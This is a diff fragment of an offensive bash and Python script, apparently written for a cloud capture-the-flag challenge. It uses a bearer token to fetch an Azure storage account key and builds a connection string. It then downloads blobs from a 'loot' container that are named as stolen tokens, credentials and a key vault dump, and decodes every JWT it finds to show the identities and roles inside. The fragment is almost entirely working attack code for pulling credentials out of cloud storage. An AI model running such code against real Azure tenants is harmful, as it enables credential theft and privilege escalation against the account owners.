@@ -35,42 +35,25 @@ st,b=http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/rg-t
           data=b"", headers={"Authorization":"Bearer "+ARM}, method="POST")
 open("/tmp/stkey","w").write(jg(b)["keys"][0]["value"])
 PYEOF
-
 KEY=$(cat /tmp/stkey); ACCT=sttblcilogsprodx3euoz
 CS="DefaultEndpointsProtocol=https;AccountName=$ACCT;AccountKey=$KEY;EndpointSuffix=core.windows.net"
-
-echo "### blob service properties (versioning / soft delete)"
-az storage account blob-service-properties show --account-name "$ACCT" -g rg-tbl-platform-prod-sea \
-   --query "{versioning:isVersioningEnabled,delRetention:deleteRetentionPolicy,containerDel:containerDeleteRetentionPolicy}" -o json 2>&1 | head -20
-
-for C in logs loot; do
+for N in README notes.txt readme.txt beacon.txt armowner_token.json escalation.json mi_loot_1792639046.json creds.json kv_dump.txt last.json out.json zz_out.json flag flag.txt; do
+  az storage blob download -c loot -n "$N" --connection-string "$CS" -f "/tmp/$N.bin" --overwrite -o none 2>/dev/null
+  echo "===== $N"
+  head -c 900 "/tmp/$N.bin" 2>/dev/null
   echo
-  echo "### container $C : ALL (versions + snapshots + deleted + metadata)"
-  az storage blob list -c "$C" --connection-string "$CS" --include dvs \
-     --query "[].{n:name,ver:versionId,snap:snapshot,del:deleted,size:properties.contentLength}" -o tsv 2>&1 | head -60
 done
-
-echo
-echo "### deleted containers"
-az storage container list --connection-string "$CS" --include-deleted --query "[].{n:name,del:deleted,ver:version}" -o tsv 2>&1 | head -20
-
-echo
-echo "### download every version/snapshot and grep"
-mkdir -p /tmp/all
-for C in logs loot; do
-  az storage blob list -c "$C" --connection-string "$CS" --include dvs --query "[].[name,versionId]" -o tsv 2>/dev/null | \
-  while IFS=$'\t' read -r N V; do
-    [ -z "$N" ] && continue
-    F="/tmp/all/$(echo "${C}_${N}_${V}" | tr '/:.' '___')"
-    if [ "$V" = "None" ] || [ -z "$V" ]; then
-      az storage blob download -c "$C" -n "$N" --connection-string "$CS" -f "$F" --overwrite -o none 2>/dev/null
-    else
-      az storage blob download -c "$C" -n "$N" --version-id "$V" --connection-string "$CS" -f "$F" --overwrite -o none 2>/dev/null
-    fi
-  done
-done
-ls -la /tmp/all | head -30
-echo "--- grep"
-grep -raoiE '(DF26|flag|CTF|cyberjutsu)\{[^}]{0,250}\}' /tmp/all 2>/dev/null | sort -u | head -20
+echo "### decode any JWTs found"
+python3 - <<'PY2'
+import base64, json, glob, re
+for f in glob.glob("/tmp/*.bin"):
+    d=open(f,"rb").read()
+    for m in re.finditer(rb"eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+", d):
+        try:
+            p=m.group(0).split(b".")[1]; p+=b"="*(-len(p)%4)
+            c=json.loads(base64.urlsafe_b64decode(p))
+            print(f"  {f}: aud={c.get('aud')} appid={c.get('appid')} oid={c.get('oid')} app_displayname={c.get('app_displayname')} roles={c.get('roles')} idtyp={c.get('idtyp')}")
+        except Exception: pass
+PY2
 rm -f /tmp/stkey
 echo "=== done ==="
